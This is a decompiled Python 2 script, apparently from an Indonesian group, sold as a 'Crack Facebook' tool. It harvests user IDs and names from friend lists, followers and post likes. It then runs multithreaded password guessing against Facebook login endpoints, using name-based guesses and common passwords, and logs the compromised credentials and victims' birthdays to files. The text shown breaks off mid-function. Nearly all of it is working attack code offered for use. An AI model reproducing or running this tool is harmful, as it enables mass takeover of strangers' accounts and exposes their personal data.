# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-01-14 14:40:52.385893
Massage_Author = '\n\n\n~~> Create Bye Panji Hitam:)\n\n'
import requests, bs4, sys, os, random, time, re, json, calendar, panji, linux
from datetime import datetime
from datetime import date
from concurrent.futures import ThreadPoolExecutor
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
reload(sys)
sys.setdefaultencoding('utf-8')
if 'linux' in sys.platform.lower():
    p = '\x1b[1;37m'
    b = '\x1b[1;36m'
    m = '\x1b[1;91m'
    h = '\x1b[1;32m'
else:
    p = ''
    b = ''
    m = ''
    h = ''
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')
    else:
        try:
            import bs4
        except ImportError:
            os.system('pip2 install bs4')
    def jalan(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.02)
    loop = 0
    id = []
    ok = []
    cp = []
    ct = datetime.now()
    n = ct.month
    bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
    try:
        if n < 0 or n > 12:
            exit()
        nTemp = n - 1
    except ValueError:
        exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
banner = "\x1b[31;1m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88    \x1b[37;1m[\x1b[41;1mI'm Not Hacker\x1b[00;1m\x1b[37;1m]\n\x1b[31;1m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[37;1m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \x1b[37;1m[\x1b[44;1mPanji Hitam Indonesia\x1b[00;1m\x1b[37;1m]\n\x1b[37;1m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\n    \x1b[37;1m[\x1b[41;1mCRACK FACEBOOK RANDOM 2022\x1b[00;1m\x1b[37;1m] \n \x1b[37;1m[\x1b[41;1mGunakan Akun Tumbal Untuk Login!\x1b[00;1m\x1b[37;1m]"
logo = '\x1b[31;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\n\x1b[31;1m\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x97\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\xa0\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x97\n\x1b[31;1m\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x97\xe2\x95\x9a\xe2\x95\xac\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\xa0\xe2\x95\x97\xe2\x95\x94\xe2\x95\xac\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97\n\x1b[31;1m\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\xa6\xe2\x95\xac\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\xa0\xe2\x95\xa3\xe2\x95\x91\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x91\n\x1b[31;1m\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x94\x80\xe2\x95\x91\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x80\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\x94\xe2\x95\x97\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\n\x1b[31;1m\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa3\xe2\x95\xa0\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x80\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\xa9\xe2\x95\x9d\n\x1b[31;1m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x91\x1b[37;1m[\x1b[41;1mPANJI HITAM INDONESIA\x1b[00;1m\x1b[37;1m]\n\x1b[31;1m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\x1b[37;1m[\x1b[41;1mCRACK FACEBOOK RANDOM 2022\x1b[00;1m\x1b[37;1m]\n'
def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')
fb = random.choice(['https://www.facebook.com/HTTPCustomIndonesia', 'https://www.facebook.com/HTTPCustomIndonesia'])
facebook = fb
def login():
    os.system('clear')
    print banner
    print '\x1b[31;1m' + 50 * '-'
    print ' %s[%s1%s] Login via token\n%s [%s2%s] Login via cookie' % (p, b, p, p, b, p)
    pil_log = raw_input('\n%s [%s\xe2\x80\xa2%s] Choose: ' % (p, b, p))
    if pil_log in ('1', '01'):
        log_token()
    elif pil_log in ('2', '02'):
        cookie()
    else:
        print '\n%s [%s!%s] Pilihan tidak ada!' % (p, m, p)
        time.sleep(1)
        login()
def log_token():
    os.system('clear')
    print logo
    print '\x1b[31;1m' + 50 * '-'
    convert = raw_input('%s [%s\xe2\x80\xa2%s] Token: ' % (p, b, p))
    try:
        saya = requests.get('https://graph.facebook.com/me?access_token=%s' % convert)
        open('login.txt', 'w').write(convert)
        print '\n %s[%s\xe2\x80\xa2%s] Login berhasil' % (p, b, p)
        jalan(' %s[%s\xe2\x80\xa2%s] Please Follow My Facebook:)' % (p, b, p))
        os.system('xdg-open %s' % facebook)
        exit(panji.panjidesu())
    except KeyError:
        print '\n %s[%s!%s] Token invalid!' % (p, m, p)
        time.sleep(1)
        login()
def update():
    print '\n %s[%s!%s] Menu sedang di update!' % (p, m, p)
    time.sleep(1)
    login()
def cookie():
    update()
    os.system('clear')
    print logo
    print '\x1b[31;1m' + 50 * '-'
    cookie = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie: ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Your Cookie Invalid' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection'
    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\n %s[%s\xe2\x80\xa2%s] Login berhasil' % (p, b, p)
    jalan(' %s[%s\xe2\x80\xa2%s] Please Follow My Facebook:)' % (p, b, p))
    os.system('xdg-open %s' % facebook)
    exit(panji.panjidesu())
    return
def menu():
    try:
        token = open('login.txt', 'r').read()
        saya = requests.get('https://graph.facebook.com/me/?access_token=%s' % token)
        i = json.loads(saya.text)
        nick = i['name']
        idme = i['id']
        ttlme = i['birthday']
        month, day, year = ttlme.split('/')
        month = bulan_ttl[month]
    except Exception as e:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo
    print '\x1b[31;1m' + 50 * '-'
    print '%s [%s\xe2\x80\xa2%s] Nickname      : %s ' % (p, b, p, nick)
    print '%s [%s\xe2\x80\xa2%s] ID facebook   : %s ' % (p, b, p, idme)
    print '%s [%s\xe2\x80\xa2%s] Tanggal lahir : %s %s %s' % (p, b, p, day, month, year)
    print '\x1b[31;1m' + 50 * '-'
    print '\n%s [%s01%s] Crack ID dari list teman sendiri ' % (p, b, p)
    print '%s [%s02%s] Crack ID dari list teman publik ' % (p, b, p)
    print '%s [%s03%s] Crack ID dari follower publik ' % (p, b, p)
    print '%s [%s04%s] Crack ID dari like publik' % (p, b, p)
    print '%s [%s05%s] Crack ID massal publik' % (p, b, p)
    print '%s [%s06%s] Cek opsi akun sesi hasil crack' % (p, b, p)
    print '%s [%s07%s] Setting useragent' % (p, b, p)
    print '%s [%s99%s] Cek hasil crack OK-cp' % (p, b, p)
    print '%s [%s00%s] Logout dari akun ini' % (p, b, p)
    pill = raw_input('\n%s [%s\xe2\x80\xa2%s] Choose: ' % (p, b, p))
    if pill in ('1', '01'):
        teman()
        panjihitam_x()
    elif pill in ('2', '02'):
        publik()
        panjihitam_x()
    elif pill in ('3', '03'):
        followers()
        panjihitam_x()
    elif pill in ('4', '04'):
        likes()
        panjihitam_x()
    elif pill in ('5', '05'):
        massal()
        panjihitam_x()
    elif pill in ('6', '06'):
        cek_opsi_sesi()
    elif pill in ('7', '07'):
        setting()
    elif pill in ('99', ):
        results()
    elif pill in ('0', '00'):
        os.system('rm -rf login.txt')
    else:
        print '\n%s [%s!%s] Pilihan tidak ada!' % (p, m, p)
        time.sleep(1)
        login()
def teman():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        for i in requests.get('https://graph.facebook.com/me/friends?access_token=%s' % token).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)
    except KeyError:
        exit('\n%s [%s!%s] Pertemanan tidak ada atau di private' % (p, m, p))
    if len(id) == 0:
        exit('\n%s [%s!%s] Maaf pertemanan target adalah 0' % (p, m, p))
    else:
        print '\n%s [%s\xe2\x80\xa2%s] Total id >>> %s' % (p, b, p, len(id))
def publik():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Masukan id target\n [%s\xe2\x80\xa2%s] ID target: ' % (p, b, p, b, p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)
    except KeyError:
        exit('\n%s [%s!%s] Pertemanan tidak ada atau di private' % (p, m, p))
    if len(id) == 0:
        exit('\n%s [%s!%s] Maaf pertemanan target adalah 0' % (p, m, p))
    else:
        print '\n%s [%s\xe2\x80\xa2%s] Total id >>> %s' % (p, b, p, len(id))
def followers():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Masukan id target\n [%s\xe2\x80\xa2%s] ID target: ' % (p, b, p, b, p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s' % (idt, token)).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)
    except KeyError:
        exit('\n%s [%s!%s] Followers tidak ada atau di private' % (p, m, p))
    if len(id) == 0:
        exit('\n%s [%s!%s] Maaf followers target adalah 0' % (p, m, p))
    else:
        print '\n%s [%s\xe2\x80\xa2%s] Total id >>> %s' % (p, b, p, len(id))
def likes():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Masukan id postingan\n [%s\xe2\x80\xa2%s] ID post target: ' % (p, b, p, b, p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/likes?limit=100000&access_token=%s' % (idt, token)).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)
    except KeyError:
        exit('\n%s [%s!%s] User likes tidak ada atau di private' % (p, m, p))
    if len(id) == 0:
        exit('\n%s [%s!%s] Maaf likes target adalah 0' % (p, m, p))
    else:
        print '\n%s [%s\xe2\x80\xa2%s] Total id >>> %s' % (p, b, p, len(id))
def massal():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        tanya_total = int(raw_input('\n%s [%s\xe2\x80\xa2%s] Jumlah massal: ' % (p, b, p)))
    except:
        tanya_total = 1
    for t in range(tanya_total):
        t += 1
        idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Masukan id target\n [%s\xe2\x80\xa2%s] ID target%s: ' % (p, b, p, b, p, t))
        try:
            for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
                idne = i['id']
                jenenge = i['name']
                id.append(idne + '<=>' + jenenge)
        except KeyError:
            exit('\n%s [%s!%s] Pertemanan tidak ada atau di private' % (p, m, p))
    if len(id) == 0:
        exit('\n%s [%s!%s] Maaf pertemanan target adalah 0' % (p, m, p))
    else:
        print '\n%s [%s\xe2\x80\xa2%s] Total id >>> %s' % (p, b, p, len(id))
def panjihitam_x():
    print '\n%s [%s Select methode crack %s]%s' % (b, p, b, p)
    print '%s [%s1%s] Crack via api.fb (%sKencang%s)' % (p, b, p, b, p)
    print '%s [%s2%s] Crack via mbasic.fb (%sNormal%s)' % (p, b, p, b, p)
    print '%s [%s3%s] Crack via mobile.fb\n' % (p, b, p)
    panjirasayanghaya = raw_input('%s [%s\xe2\x80\xa2%s] Choose: ' % (p, b, p))
    if panjirasayanghaya in ('', ):
        exit('\n%s [%s!%s] Pilihan tidak boleh kosong!' % (p, m, p))
    elif panjirasayanghaya in ('1', '01'):
        bukanmaen = raw_input('%s [%s\xe2\x80\xa2%s] Crack With Pass Default/Manual [d/m]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, b, p, p, b, p))
        if bukanmaen in ('m', 'M'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: sayang, ganteng, cantik\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, b, p, p, b, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Jangan kosong' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s] Hasil ok tersimpan di : ok.txt\n %s[%s\xe2\x80\xa2%s] Hasil cp tersimpan di : cp.txt' % (p, b, p, p, b, p)
                print '%s [%s\xe2\x80\xa2%s] Mode pesawat 5/10 sec jika tidak ada hasil!' % (p, b, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(api, uid, asu)
            hasil()
        elif bukanmaen in ('d', 'D'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s] Hasil ok tersimpan di : ok.txt\n %s[%s\xe2\x80\xa2%s] Hasil cp tersimpan di : cp.txt' % (p, b, p, p, b, p)
                print '%s [%s\xe2\x80\xa2%s] Mode pesawat 5/10 sec jika tidak ada hasil!' % (p, b, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 9:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 2:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 3:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 4:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    else:
                        panjihitam = [
                         'sayang', 'bissmilah', 'anjing', 'bangsat', 'freefire', 'katasandi', 'indonesia', 'sayangkamu', 'iloveyou', 'imissyou', 'password', 'semangat']
                    coeg.submit(api, uid, panjihitam)
            hasil()
    elif panjisayanghaya == '2':
        bukanmaen = raw_input('%s [%s\xe2\x80\xa2%s] Crack With Pass Default/Manual [d/m]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, b, p, p, b, p))
        if bukanmaen in ('m', 'M'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: sayang, ganteng, cantik\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, b, p, p, b, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Jangan kosong' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s] Hasil ok tersimpan di : ok.txt\n %s[%s\xe2\x80\xa2%s] Hasil cp tersimpan di : cp.txt' % (p, b, p, p, b, p)
                print '%s [%s\xe2\x80\xa2%s] Mode pesawat 5/10 sec jika tidak ada hasil!' % (p, b, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(mbasic, uid, asu)
            hasil()
        elif bukanmaen == 'd':
            with ThreadPoolExecutor(max_workers=35) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s] Hasil ok tersimpan di : ok.txt\n %s[%s\xe2\x80\xa2%s] Hasil cp tersimpan di : cp.txt' % (p, b, p, p, b, p)
                print '%s [%s\xe2\x80\xa2%s] Mode pesawat 5/10 sec jika tidak ada hasil!' % (p, b, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 2:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 3:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                        panjihitam = [name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    else:
                        panjihitam = [
                         'sayang', 'bissmilah', 'anjing', 'bangsat', 'freefire', 'katasandi', 'indonesia', 'sayangkamu', 'iloveyou', 'imissyou', 'password', 'semangat']
                    coeg.submit(mbasic, uid, panjihitam)
            hasil()
    elif panjisayanghaya == '3':
        bukanmaen = raw_input('%s [%s\xe2\x80\xa2%s] Crack With Pass Default/Manual [d/m]\n %s[%s\xe2\x80\xa2%s] Choose: ' % (p, b, p, p, b, p))
        if bukanmaen in ('m', 'M'):
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                asu = raw_input('%s [%s\xe2\x80\xa2%s] Example password: sayang, ganteng, cantik\n %s[%s\xe2\x80\xa2%s] Pass list: ' % (p, b, p, p, b, p)).split(',')
                if len(asu) == '':
                    exit('%s [%s!%s] Jangan kosong' % (p, m, p))
                print '\n%s [%s\xe2\x80\xa2%s] Hasil ok tersimpan di : ok.txt\n %s[%s\xe2\x80\xa2%s] Hasil cp tersimpan di : cp.txt' % (p, b, p, p, b, p)
                print '%s [%s\xe2\x80\xa2%s] Mode pesawat 5/10 sec jika tidak ada hasil!' % (p, b, p)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(freefb, uid, asu)
            hasil()
        elif bukanmaen == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print '\n%s [%s\xe2\x80\xa2%s] Hasil ok tersimpan di : ok.txt\n %s[%s\xe2\x80\xa2%s] Hasil cp tersimpan di : cp.txt' % (p, b, p, p, b, p)
                print '%s [%s\xe2\x80\xa2%s] Mode pesawat 5/10 sec jika tidak ada hasil!' % (p, b, p)
                for user in id:
                    uid, name = user.split('<=>')
                    frist = name.split(' ')
                    if len(frist) >= 6:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 2:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    elif len(frist) <= 3:
                        panjihitam = [
                         name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                        panjihitam = [name, frist[0], frist[0] + '123', frist[0] + '12345', frist[0] + '123456', frist[0] + '1234567', frist[0] + '12345678', frist[0] + '123456789']
                    else:
                        panjihitam = [
                         'sayang', 'bissmilah', 'anjing', 'bangsat', 'freefire', 'katasandi', 'indonesia', 'sayangkamu', 'iloveyou', 'imissyou', 'password', 'semangat']
                    coeg.submit(mobile, uid, panjihitam)
            hasil()
        else:
            exit('\n%s [%s!%s] Pilihan tidak ada!' % (p, m, p))
    else:
        menu()
def api(uid, panjihitam):
    global cp
    global loop
    global ok
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
    sys.stdout.write('\r [Crack] %s/%s OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in panjihitam:
        pw = pw.lower()
        ses = requests.Session()
        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
        send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r \x1b[1;32m[OK] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('ok.txt', 'a').write('%s|%s\n' % (uid, pw))
            break
        elif 'www.facebook.com' in send.json()['error_msg']:
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r\x1b[1;33m [CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s %s %s\x1b[0;97m' % (uid, pw, day, month, year)
                    cp.append('%s|%s' % (uid, pw))
                    open('cp.txt', 'a').write('%s|%s|%s\n' % (uid, pw, ttl))
                    open('checkcpoint.txt', 'a').write('%s|%s|%s\n' % (uid, pw, ttl))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass
            print '\r\x1b[1;33m [CP] %s \xe2\x80\xa2 %s\x1b[0;97m        ' % (uid, pw)
            cp.append('%s|%s' % (uid, pw))
            open('cp.txt', 'a').write('%s|%s\n' % (uid, pw))
            open('checkcpoint.txt', 'a').write('%s|%s\n' % (uid, pw))
            break
        else:
            continue
    loop += 1
def mbasic(uid, panjihitam):
    global loop
    global token
    try:
        ua = open('ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
    sys.stdout.write('\r [Crack] %s/%s OK:-%s - CP:-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    for pw in panjihitam:
        kwargs = {}
        pw = pw.lower()
        ses = requests.Session()
        ses.headers.update({'origin': 'https://mbasic.facebook.com', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': 'mbasic.facebook.com', 'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
        p = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&refid=8').text
        b = parser(p, 'html.parser')
        bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
        for i in b('input'):
            try:
                if i.get('name') in bl:
                    kwargs.update({i.get('name'): i.get('value')})
                else:
                    continue
            except:
                pass
        kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
        panji = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
        if 'c_user' in ses.cookies.get_dict().keys():
